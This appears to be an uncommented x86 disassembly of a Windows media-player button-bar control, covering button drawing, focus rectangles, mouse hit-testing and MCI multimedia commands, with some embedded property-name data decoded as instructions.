xor [ edi + 0x10046 ] cl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
or al [ ecx + 0x75 ]
je r-xdata
pop ds
add eax [ eax ]
[ edi ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ecx ] cl
push ebx
push 0x61657261
jb r-xdata
popad
inc ebp
outsb
popad
bound ebp [ ebp ]
adc [ eax ] al
sbb eax 0x1dff0003
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
outsb
je r-xdata
imul ebp [ ebp + 0x4e ] 0x656d61
adc [ eax ] al
add [ eax + 0x46080016 ] al
imul ebp [ esi + 0x74 ] 0x4684e073
add ah dh
add al [ eax ]
dec eax
test eax 0x10046
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x0
or al [ ebp + 0x76 ]
imul esp [ ebx + 0x65 ] 0x65707954
add [ edi ] ch
push esp
dec edi
jo r-xdata
rol [ eax + eax + 0x70 ] 0x1
rol [ eax + eax + 0x1 ] cl
add [ eax ] al
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
add bh bh
test [ esi + 0x44 ] ah
add ah dl
xchg [ eax + eax ] eax
inc esp
add [ ebx + eax ] cl
add bh bh
adc al 0xaa
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44070015 ] al
add [ gs : edi ] ch
add [ edx ] cl
inc esp
jbe r-xdata
outsb
add [ eax ] dl
inc eax
add [ esi ] bl
add eax [ eax ]
[ esi ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ eax + ebp * 2 + 0x687c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
jns r-xdata
arpl [ ebp + 0x54 ] sp
jo r-xdata
push edx
ja r-xdata
inc esp
add [ ecx ] al
pop ecx
inc ebp
add [ eax + eax ] bh
[ edi ]
add [ eax + 0x5308001a ] al
push 0x6948776f
outsb
je r-xdata
bound ebp [ ebp ]
adc [ eax ] al
push edi
add [ eax ] al
inc [ esi - 0x782bffbc ]
inc esp
add [ eax ] al
popad
adc [ eax ] al
0xd8ff0000 0x4468
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
popad
jns r-xdata
imul esi [ ebx + 0x70 ] 0xac79616c
outsb
sub [ fs : esp + eax * 2 ] bl
add [ eax + eax ] dh
[ esp + ecx * 4 ]
outsd
ja r-xdata
test [ esi ] eax
enter 0x2 0xff
enter 0x2 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ edi ] al
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001f ] al
jo r-xdata
outsb
jae r-xdata
or eax [ ebx + 0x6f ]
adc [ eax ] al
sbb [ ebx ] al
add bh bh
sbb [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ eax ] cl
inc esi
jb r-xdata
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
dec edi
outsb
js r-xdata
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ esi ] cl
dec edi
add al [ eax ]
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001e ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ eax + 0x10044d2 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
outsd
jo r-xdata
add bh bh
sbb al 0x67
add [ eax ] al
add [ eax ] al
dec ebp
push eax
inc ebp
dec edx
inc ebp
inc ebx
push esp
add [ ebp - 0x75 ] dl
in al dx
push ecx
push ebx
test dl dl
je r-xdata
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
add [ eax ] eax
push eax
outsd
jo r-xdata
add [ eax ] al
cmp bh 0xff
sbb eax [ eax + eax - 0x10 ]
mov [ ebp - 0x1 ] dl
mov ebx eax
add esp 0xfffffff0
call sub_4035bc
xor edx edx
mov eax ebx
call sub_44ecd8
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_468d88
mov ax [ r-xdata ]
mov [ ebx + 0x2a0 ] ax
mov ax [ r-xdata ]
mov [ ebx + 0x2a2 ] ax
mov ax [ r-xdata ]
mov [ ebx + 0x2a4 ] ax
xor eax eax
stc
dec [ eax - 0x277400ab ]
jns r-xdata
dec esi
outsd
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080023 ] al
outsb
jo r-xdata
xor edx edx
mov dl al
add edx edx
mov [ ebx + edx * 8 + 0x210 ] 0x1
mov [ ebx + edx * 8 + 0x211 ] 0x1
mov [ ebx + edx * 8 + 0x212 ] 0x1
mov [ ebx + edx * 8 + 0x213 ] 0x0
inc eax
cmp al 0x9
jne r-xdata
mov edx 0xf0
mov eax ebx
call sub_445f20
mov edx 0x1e
mov eax ebx
call sub_445f44
mov [ ebx + 0x2e0 ] 0x0
mov [ ebx + 0x31c ] 0x1
mov [ ebx + 0x31d ] 0x0
mov [ ebx + 0x31e ] 0x1
mov [ ebx + 0x2f4 ] 0x0
mov dl 0x1
mov eax ebx
call sub_44d288
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push edx
inc ebp
inc ebx
dec edi
push edx
inc esp
dec esi
add [ eax ] al
inc esp
dec ecx
add [ eax ] al
inc ebx
dec esp
add [ eax ] al
dec ebp
push eax
push eax
dec esp
inc ecx
pop ecx
add [ eax ] al
dec ebp
push eax
push eax
inc ecx
push ebp
push ebx
inc ebp
add [ ebp + 0x50 ] cl
push ebx
push eax
outsd
jae r-xdata
add [ eax - 0x80000000 ] al
and al [ eax ]
or ecx [ edi + 0x6e ]
pop eax
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070020 ] al
outsb
inc ebp
outsb
je r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or [ edi + 0x6e ] cl
pop eax
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060021 ] al
push esp
dec edi
push eax
add [ eax ] al
dec ebp
push eax
dec esi
inc ebp
pop eax
push esp
add [ eax ] al
dec ebp
push eax
push eax
push edx
inc ebp
push esi
add [ eax ] al
dec ebp
push eax
push ebx
push esp
inc ebp
push eax
add [ eax ] al
dec ebp
push eax
inc edx
inc ecx
inc ebx
dec ebx
add [ eax ] al
dec ebp
push eax
je r-xdata
outsb
inc ebp
js r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
push es
dec edi
test [ esi ] eax
rol [ edx ] 0x1
add bh bh
rol [ edx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
sub_468d12
add [ eax ] al
push ebx
push esi
push ecx
call sub_403624
mov ebx edx
mov esi eax
mov ax [ esi + 0x2f2 ]
test ax ax
je r-xdata
mov eax esi
call sub_468ef8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44ed34
test bl bl
jle r-xdata
mov edx esp
push edx
push 0x2
push 0x804
movzx eax ax
push eax
call mciSendCommandA
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_468d88
push ebx
push esi
push edi
push ebp
add esp 0xffffffbc
mov esi eax
lea ecx [ esp + 0x2c ]
xor edx edx
xor eax eax
call sub_416eec
mov eax [ esp + 0x2c ]
mov [ esi + 0x2c0 ] eax
mov eax [ esp + 0x30 ]
mov [ esi + 0x2c4 ] eax
mov [ esp ] 0x0
mov ebp rw-data
xor eax eax
mov al bl
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ esi + edx * 8 ]
mov eax [ edx + eax * 4 + 0x214 ]
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ esi + 0x2c4 ]
jle r-xdata
xor eax eax
mov al bl
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ esi + edx * 8 ]
mov eax [ edx + eax * 4 + 0x214 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov [ esi + 0x2c0 ] eax
inc ebx
add edi 0x4
cmp bl 0x3
jne r-xdata
xor eax eax
mov al bl
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ esi + edx * 8 ]
mov eax [ edx + eax * 4 + 0x214 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov [ esi + 0x2c4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
xor edx edx
mov dl bl
xor ecx ecx
mov cl [ esp ]
add ecx ecx
lea ecx [ esi + ecx * 8 ]
mov [ ecx + edx * 4 + 0x214 ] eax
push 0x1
mov eax [ edi ]
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] 0x6
mov eax [ ebp ]
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] 0x6
lea ecx [ esp + 0x38 ]
mov edx r-xdata
lea eax [ esp + 0x5 ]
call sub_408d28
push eax
mov eax [ rw-data ]
push eax
call LoadBitmapA
mov edx eax
xor eax eax
mov al bl
xor ecx ecx
mov cl [ esp ]
add ecx ecx
lea ecx [ esi + ecx * 8 ]
mov eax [ ecx + eax * 4 + 0x214 ]
call sub_4283e0
xor eax eax
mov al bl
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ esi + edx * 8 ]
mov eax [ edx + eax * 4 + 0x214 ]
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ esi + 0x2c0 ]
jle r-xdata
inc [ esp ]
add ebp 0x4
cmp [ esp ] 0x9
jne r-xdata
xor ebx ebx
mov edi rw-data
add [ esi + 0x2c0 ] 0x8
add [ esi + 0x2c4 ] 0x4
add esp 0x44
pop ebp
pop edi
pop esi
pop ebx
retn
sub_468ef8
push ebx
push esi
push ecx
mov esi eax
mov [ esp ] 0x0
xor eax eax
mov al [ esp ]
add eax eax
lea eax [ esi + eax * 8 ]
xor edx edx
mov dl bl
mov eax [ eax + edx * 4 + 0x214 ]
call sub_403270
inc ebx
cmp bl 0x3
jne r-xdata
inc [ esp ]
cmp [ esp ] 0x9
jne r-xdata
xor ebx ebx
pop edx
pop esi
pop ebx
retn
sub_468f58
push ebx
push ecx
mov [ esp ] dx
mov dx [ esp ]
mov [ eax + 0x2a2 ] dx
xor edx edx
setb cl
xor ebx ebx
mov bl dl
add ebx ebx
mov [ eax + ebx * 8 + 0x211 ] cl
inc edx
cmp dl 0x9
jne r-xdata
and ecx 0x7f
bt [ eax + 0x2a2 ] ecx
mov ecx edx
cmp cl 0xf
ja r-xdata
mov edx [ eax ]
call [ edx + 0x7c ]
pop edx
pop ebx
retn
sub_468f9c
push ebx
xor edx edx
setb cl
xor ebx ebx
mov bl dl
add ebx ebx
mov [ eax + ebx * 8 + 0x213 ] cl
inc edx
cmp dl 0x9
jne r-xdata
and ecx 0x7f
bt [ eax + 0x2a6 ] ecx
mov ecx edx
cmp cl 0xf
ja r-xdata
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_468fd0
push ebx
push ecx
mov [ esp ] dx
mov dx [ esp ]
mov [ eax + 0x2a4 ] dx
xor edx edx
setb cl
xor ebx ebx
mov bl dl
add ebx ebx
mov [ eax + ebx * 8 + 0x212 ] cl
inc edx
cmp dl 0x9
jne r-xdata
and ecx 0x7f
bt [ eax + 0x2a4 ] ecx
mov ecx edx
cmp cl 0xf
ja r-xdata
mov edx [ eax ]
call [ edx + 0x7c ]
pop edx
pop ebx
retn
sub_469014
push ebx
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
mov [ ebx + 0x2a0 ] ax
xor eax eax
setb dl
xor ecx ecx
mov cl al
add ecx ecx
mov [ ebx + ecx * 8 + 0x210 ] dl
inc eax
cmp al 0x9
jne r-xdata
and edx 0x7f
bt [ ebx + 0x2a0 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
test [ ebx + 0x1c ] 0x40
je r-xdata
mov eax ebx
call sub_4690ac
pop edx
pop ebx
retn
mov eax ebx
call sub_469084
push eax
mov eax [ ebx + 0x48 ]
dec eax
pop edx
mov ecx edx
cdq
idiv ecx
inc eax
mov [ ebx + 0x2bc ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop edx
pop ebx
retn
sub_469084
push esi
xor esi esi
xor edx edx
inc edx
cmp dl 0x9
jne r-xdata
inc esi
xor ecx ecx
mov cl dl
add ecx ecx
cmp [ eax + ecx * 8 + 0x210 ] 0x0
je r-xdata
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
inc esi
sub_4690ac
push ebx
mov ebx eax
mov eax ebx
call sub_469084
mov edx [ ebx + 0x2bc ]
dec edx
imul edx eax
inc edx
mov eax ebx
call sub_445f20
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4690d4
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp ] edx
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_44b640
test [ ebx + 0x1c ] 0x40
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_469084
mov ecx eax
mov eax [ ebx + 0x2c0 ]
dec eax
imul ecx
inc eax
mov [ esp + 0x4 ] eax
mov esi [ ebx + 0x2c4 ]
mov [ esp + 0x8 ] esi
mov eax [ ebx + 0x48 ]
dec eax
cdq
idiv ecx
mov edi eax
inc edi
mov [ ebx + 0x2bc ] edi
mov eax edi
dec eax
imul ecx
inc eax
mov edx [ esp + 0x4 ]
cmp eax edx
jge r-xdata
mov edx [ ebx + 0x4c ]
cmp esi edx
jg r-xdata
mov eax edx
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov esi edx
push eax
push esi
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
cmp esi [ ebx + 0x4c ]
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax + 0xc ] edx
sub_469164
push ebx
push esi
push edi
push ebp
add esp 0xffffffc4
mov edi ecx
mov [ esp ] dl
mov ebx eax
cmp [ ebx + 0x2a9 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov al [ esp ]
cmp al [ ebx + 0x2aa ]
je r-xdata
mov [ esp + 0x1 ] al
mov esi [ ebx + 0x208 ]
xor edx edx
mov eax [ esi + 0x14 ]
call sub_424200
mov edx 0xff00000f
mov eax [ esi + 0x14 ]
call sub_4240e4
mov edx 0xff000006
mov eax [ esi + 0x10 ]
call sub_423e04
mov edx 0x1
mov eax [ esi + 0x10 ]
call sub_423f10
mov eax [ ebx + 0x2bc ]
add eax edi
push eax
mov eax [ ebx + 0x4c ]
push eax
xor ecx ecx
mov edx edi
mov eax esi
call sub_4248b8
cmp [ esp + 0x1 ] 0x0
je r-xdata
mov al 0x1
mov edx 0xff000014
mov eax [ esi + 0x10 ]
call sub_423e04
mov ecx [ ebx + 0x4c ]
sub ecx 0x2
lea ebp [ edi + 0x1 ]
mov edx ebp
mov eax esi
call sub_424854
mov edx ebp
mov ecx 0x1
mov eax esi
call sub_4247f4
mov edx [ ebx + 0x2bc ]
add edx edi
dec edx
mov ecx 0x1
mov eax esi
call sub_4247f4
mov edx 0xff000010
mov eax [ esi + 0x10 ]
call sub_423e04
mov ecx [ ebx + 0x4c ]
sub ecx 0x2
lea edx [ edi + 0x2 ]
mov eax esi
call sub_424854
mov ecx [ ebx + 0x4c ]
sub ecx 0x2
mov edx [ ebx + 0x2bc ]
add edx edi
sub edx 0x2
mov eax esi
call sub_4247f4
mov edx [ ebx + 0x2bc ]
add edx edi
sub edx 0x2
mov ecx 0x1
mov eax esi
call sub_4247f4
mov edx 0xff000010
mov eax [ esi + 0x10 ]
call sub_423e04
mov ecx [ ebx + 0x4c ]
sub ecx 0x2
lea ebp [ edi + 0x1 ]
mov edx ebp
mov eax esi
call sub_424854
mov edx ebp
mov ecx 0x1
mov eax esi
call sub_4247f4
mov edx [ ebx + 0x2bc ]
add edx edi
dec edx
mov ecx 0x1
mov eax esi
call sub_4247f4
jmp r-xdata
cmp [ ebx + 0x31c ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
xor eax eax
mov al [ esp ]
mov edx eax
add edx edx
cmp [ ebx + edx * 8 + 0x211 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov al 0x1
mov al 0x1
jmp r-xdata
xor eax eax
cmp [ ebx + edx * 8 + 0x212 ] 0x0
je r-xdata
xor eax eax
mov al [ esp ]
mov edx eax
add edx edx
cmp [ ebx + edx * 8 + 0x213 ] 0x0
je r-xdata
mov edx [ ebx + 0x2bc ]
sar edx 0x1
jns r-xdata
adc eax 0x0
and eax 0x7f
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ ebx + edx * 8 ]
mov ebp [ edx + eax * 4 + 0x214 ]
mov eax ebp
mov edx [ eax ]
call [ edx + 0x2c ]
sar eax 0x1
jns r-xdata
mov al 0x2
jmp r-xdata
mov al 0x1
jmp r-xdata
xor eax eax
cmp [ ebx + edx * 8 + 0x212 ] 0x0
je r-xdata
sub edx eax
mov [ esp + 0x4 ] edx
mov eax ebp
mov edx [ eax ]
call [ edx + 0x20 ]
sar eax 0x1
jns r-xdata
adc edx 0x0
mov al 0x2
jmp r-xdata
mov edx [ ebx + 0x4c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
sub edx eax
mov [ esp + 0x8 ] edx
cmp [ esp + 0x1 ] 0x0
je r-xdata
adc edx 0x0
mov eax ebp
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov eax ebp
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416f14
lea eax [ esp + 0x1c ]
push eax
push 0x8080
mov eax ebp
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ esp + 0x38 ]
push eax
mov eax ebp
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
mov eax [ esp + 0x14 ]
add eax edi
mov edx [ esp + 0x18 ]
call sub_416f3c
lea edx [ esp + 0x34 ]
mov ecx ebp
mov eax esi
call sub_424354
mov eax ebx
call sub_44d054
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
inc [ esp + 0x4 ]
inc [ esp + 0x8 ]
add esp 0x3c
pop ebp
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
cmp al [ ebx + 0x2e0 ]
jne r-xdata
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ ebx + 0x2bc ]
xor edx edx
mov eax edi
call sub_416f3c
push 0xfffffffd
push 0xfffffffd
lea eax [ esp + 0x14 ]
push eax
call InflateRect
cmp [ esp + 0x1 ] 0x0
je r-xdata
lea eax [ esp + 0xc ]
push eax
mov eax [ ebx + 0x208 ]
call sub_424b20
push eax
call DrawFocusRect
push 0x1
push 0x1
lea eax [ esp + 0x14 ]
push eax
call OffsetRect
sub_469460
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x208 ]
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_424200
mov eax [ ebx + 0x10 ]
mov edx 0xff000006
call sub_423e04
mov eax [ ebx + 0x10 ]
mov edx 0x1
call sub_423f10
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4248b8
xor edi edi
xor ebx ebx
inc ebx
cmp bl 0x9
jne r-xdata
mov ecx edi
mov edx ebx
mov eax esi
call sub_469164
mov eax [ esi + 0x2bc ]
dec eax
add edi eax
xor eax eax
mov al bl
add eax eax
cmp [ esi + eax * 8 + 0x210 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4694d4
push ebx
mov ebx eax
xor eax eax
mov al dl
cmp eax 0x8
ja r-xdata
pop ebx
retn
jmp [ eax * 4 + jump_table_4694eb ]
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
mov ax [ r-xdata ]
or ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
mov ax [ r-xdata ]
or ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
or [ ebx + 0x2a6 ] 0x80
pop ebx
retn
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
or [ ebx + 0x2a6 ] 0x80
sub_4696fc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
xor edi edi
xor ebx ebx
inc ebx
cmp bl 0x9
jne r-xdata
cmp edi edx
jg r-xdata
xor eax eax
mov al bl
add eax eax
cmp [ esi + eax * 8 + 0x210 ] 0x0
je r-xdata
mov eax ebx
mov [ esi + 0x2aa ] al
cmp al [ esi + 0x2e0 ]
je r-xdata
mov eax [ esi + 0x2bc ]
dec eax
add edi eax
mov eax [ esi + 0x2bc ]
add eax edi
cmp edx eax
jg r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ esi + 0x2bc ]
add ecx edi
xor edx edx
mov eax edi
call sub_416f14
push esi
push edi
lea edi [ esi + 0x2ab ]
lea esi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov [ esi + 0x2a8 ] 0x1
mov [ esi + 0x2a9 ] 0x1
mov ecx edi
mov edx ebx
mov eax esi
call sub_469164
mov dl 0x1
mov eax esi
call sub_44699c
mov [ esi + 0x2e0 ] al
mov eax esi
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp [ esi + 0x31c ] 0x0
je r-xdata
xor eax eax
mov al bl
add eax eax
cmp [ esi + eax * 8 + 0x211 ] 0x0
jne r-xdata
xor eax eax
mov al bl
add eax eax
cmp [ esi + eax * 8 + 0x213 ] 0x0
jne r-xdata
jmp r-xdata
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4697fc
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov edi eax
cmp [ edi + 0x2a8 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
movsx edx [ esi + 0xa ]
movsx eax [ esi + 0x8 ]
call sub_416eec
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ edi + 0x2ab ]
push eax
call PtInRect
cmp eax 0x1
sbb eax eax
inc eax
mov bl [ edi + 0x2a9 ]
cmp al bl
je r-xdata
xor bl 0x1
mov [ edi + 0x2a9 ] bl
mov ecx [ edi + 0x2ab ]
mov dl [ edi + 0x2aa ]
mov eax edi
call sub_469164
sub_469864
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x1
mov ecx esp
mov dl [ ebx + 0x2aa ]
mov eax ebx
mov si 0xffb2
call sub_40346c
cmp [ esp ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x2aa ]
cmp eax 0x8
ja r-xdata
mov dl [ ebx + 0x2aa ]
mov eax ebx
call sub_469924
jmp [ eax * 4 + jump_table_46989e ]
mov eax ebx
call sub_469fa4
jmp r-xdata
mov eax ebx
call sub_46a220
jmp r-xdata
mov eax ebx
call sub_46a18c
jmp r-xdata
mov eax ebx
call sub_46a3b4
jmp r-xdata
mov eax ebx
call sub_46a544
jmp r-xdata
mov eax ebx
call sub_46a700
jmp r-xdata
mov eax ebx
call sub_46a7dc
jmp r-xdata
mov eax ebx
call sub_46a0b4
jmp r-xdata
mov eax ebx
call sub_46a8a0
sub_469938
push ebx
push esi
mov ebx eax
xor edx edx
mov eax ebx
call sub_44699c
cmp [ ebx + 0x2a8 ] 0x0
je r-xdata
mov [ ebx + 0x2a8 ] 0x0
pop esi
pop ebx
retn
cmp [ ebx + 0x2a9 ] 0x0
je r-xdata
mov [ ebx + 0x2a9 ] 0x0
mov ecx [ ebx + 0x2ab ]
mov dl [ ebx + 0x2aa ]
mov eax ebx
call sub_469164
mov dl [ ebx + 0x2aa ]
mov eax ebx
call sub_469864
cmp [ ebx + 0x31c ] 0x0
je r-xdata
cmp [ ebx + 0x304 ] 0x0
jne r-xdata
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
mov dl [ ebx + 0x2aa ]
mov eax ebx
mov si 0xffb3
call sub_40346c
mov eax ebx
call sub_468f9c
sub_4699dc
push esi
push edi
mov edi eax
mov ax [ edx ]
sub ax 0x20
je r-xdata
mov al [ edi + 0x2e0 ]
xor edx edx
mov dl al
add edx edx
cmp [ edi + edx * 8 + 0x211 ] 0x0
je r-xdata
sub ax 0x5
je r-xdata
pop edi
pop esi
retn
mov edx eax
mov [ edi + 0x2aa ] dl
mov eax edi
call sub_469864
cmp [ edi + 0x31c ] 0x0
je r-xdata
mov al [ edi + 0x2e0 ]
sub ax 0x2
jne r-xdata
mov dl [ edi + 0x2aa ]
mov eax edi
mov si 0xffb3
call sub_40346c
mov eax edi
call sub_468f9c
test al al
je r-xdata
dec eax
mov al [ edi + 0x2e0 ]
cmp al [ edi + 0x2e0 ]
je r-xdata
xor edx edx
mov dl al
add edx edx
cmp [ edi + edx * 8 + 0x210 ] 0x0
je r-xdata
cmp al 0x8
je r-xdata
inc eax
mov [ edi + 0x2e0 ] al
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
pop edi
pop esi
retn
test al al
jbe r-xdata
cmp al [ edi + 0x2e0 ]
je r-xdata
xor edx edx
mov dl al
